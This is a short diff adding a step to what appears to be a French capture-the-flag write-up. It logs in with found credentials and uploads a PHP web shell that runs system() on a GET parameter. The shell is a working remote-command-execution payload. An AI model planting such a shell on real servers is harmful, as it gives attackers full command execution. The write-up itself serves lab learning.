@@ -69,3 +69,13 @@ Lançons une console et essayons de comprendre:
 ![image](image3.png)
 
 Mmmmh, fort interessant ! 
+Utilisons donc les credentials `clave:11des0081x` pour se connecter et rendons nous dans Administrator/Profil, il nous  suffit maintenant d'upload un shell.php qu'on va faire:
+```php
+<?php
+echo "<pre>";
+system($_GET["c"]);
+echo "</pre>";
+?> 
+```
+
+
